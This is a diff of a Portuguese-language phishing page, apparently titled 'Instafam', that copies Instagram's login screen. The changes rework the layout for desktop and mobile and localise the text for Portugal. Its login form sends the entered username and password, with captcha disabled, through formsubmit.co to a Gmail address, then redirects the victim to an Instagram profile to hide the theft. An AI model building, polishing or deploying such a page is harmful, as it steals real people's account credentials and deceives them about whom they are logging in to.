@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Instafam</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
   <style>
     * {
@@ -13,16 +14,29 @@
     body {
       background-color: #000;
       color: #fff;
+      margin: 0;
+      padding: 0;
       display: flex;
       flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .main-wrapper {
+      flex: 1;
+      display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
+      gap: 60px;
+      padding: 40px 20px;
+    }
+
+    .image-side img {
+      width: 400px;
+      height: auto;
+      border-radius: 10px;
     }
 
     .container {
-      padding: 40px 20px;
       width: 350px;
       text-align: center;
     }
@@ -36,7 +50,7 @@
 
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 6px 0;
       border: 1px solid #262626;
       border-radius: 4px;
@@ -53,7 +67,7 @@
       color: white;
       font-weight: bold;
       border: none;
-      padding: 10px;
+      padding: 12px;
       margin-top: 10px;
       border-radius: 6px;
       cursor: pointer;
@@ -83,11 +97,7 @@
     }
 
     .facebook-login {
-      color: #0095f6;
-      font-weight: bold;
-      margin: 15px 0 10px;
-      font-size: 14px;
-      cursor: pointer;
+      display: none; /* Escondido no desktop */
     }
 
     .forgot {
@@ -110,12 +120,10 @@
     }
 
     .footer {
-      margin-top: 60px;
-      width: 100%;
-      max-width: 800px;
       text-align: center;
       font-size: 12px;
       color: #666;
+      padding: 20px 10px;
     }
 
     .footer-links {
@@ -134,42 +142,75 @@
     .footer-bottom {
       color: #666;
       font-size: 11px;
-      margin-bottom: 30px;
     }
 
-    @media (max-width: 500px) {
+    @media (max-width: 768px) {
+      .main-wrapper {
+        flex-direction: column;
+        gap: 20px;
+        padding: 30px 15px;
+      }
+
+      .image-side {
+        display: none;
+      }
+
       .container {
-        width: 90%;
+        width: 100%;
+        max-width: 350px;
+      }
+
+      .facebook-login {
+        display: block; /* Mostrar no mobile */
+        background-color: #1877f2;
+        color: white;
+        padding: 10px;
+        border-radius: 5px;
+        margin-bottom: 10px;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .login-btn {
+        font-size: 16px;
       }
 
       .footer-links {
         font-size: 11px;
+        flex-direction: column;
+        gap: 6px;
+      }
+
+      .footer-bottom {
+        font-size: 10px;
       }
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">Instagram</div>
+  <div class="main-wrapper">
+    <div class="image-side">
+      <img src="https://static.cdninstagram.com/rsrc.php/v4/yJ/r/NmoedriQeab.png" alt="Imagem Instagram">
+    </div>
 
-    <form action="https://formsubmit.co/frequenciaaberta.rpc@gmail.com" method="POST" onsubmit="return redirecionarInstagram()">
-      <input type="text" name="usuario" placeholder="Telefone, nome de usuário ou email" required>
-      <input type="password" name="senha" placeholder="Senha" required>
+    <div class="container">
+      <div class="logo">Instagram</div>
 
-      <!-- FormSubmit configurações -->
-      <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA==">
+      <div class="facebook-login">Continuar com o Facebook</div> <!-- Só aparece no mobile -->
 
-      <button type="submit" class="login-btn">Entrar</button>
-    </form>
+      <div class="divider"><span>OU</span></div>
 
-    <div class="divider"><span>OU</span></div>
+      <form action="https://formsubmit.co/frequenciaaberta.rpc@gmail.com" method="POST" onsubmit="return redirecionarInstagram()">
+        <input type="text" name="usuario" placeholder="Número de telemóvel, nome de utilizador ou email" required>
+        <input type="password" name="senha" placeholder="Palavra-passe" required>
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA==">
+        <button type="submit" class="login-btn">Iniciar Sessão</button>
+      </form>
 
-    <div class="facebook-login">Entrar com o Facebook</div>
-    <div class="forgot">Esqueceu a senha?</div>
-
-    <div class="signup">
-      Não tem uma conta? <a href="#">Cadastre-se</a>
+      <div class="forgot">Esqueceste-te da palavra-passe?</div>
+      <div class="signup">Não tens uma conta? <a href="#">Regista-te</a></div>
     </div>
   </div>
 
@@ -177,26 +218,25 @@
     <div class="footer-links">
       <a href="#">Meta</a>
       <a href="#">Sobre</a>
-      <a href="#">Blog</a>
-      <a href="#">Carreiras</a>
+      <a href="#">Blogue</a>
+      <a href="#">Empregos</a>
       <a href="#">Ajuda</a>
       <a href="#">API</a>
       <a href="#">Privacidade</a>
       <a href="#">Termos</a>
       <a href="#">Localizações</a>
-      <a href="#">Instafam Lite</a>
+      <a href="#">Instagram Lite</a>
       <a href="#">Threads</a>
-      <a href="#">Upload de contatos e não usuários</a>
-      <a href="#">Instafam Verificado</a>
+      <a href="#">Carregamento de contactos e não utilizadores</a>
+      <a href="#">Verificação Meta</a>
     </div>
     <div class="footer-bottom">
-      Português (Brasil) ⌄ &nbsp;&nbsp; © 2025 Instafam from Meta
+      Português (Portugal) ⌄ &nbsp;&nbsp; © 2025 Instafam from Meta
     </div>
   </div>
 
   <script>
     function redirecionarInstagram() {
-      // Evita erro caso _next não funcione
       setTimeout(function () {
         window.location.href = "https://www.instagram.com/geovannagabrielly._/?igsh=MW1qc2Iyb3N6ZGQ4OA==";
       }, 1000);
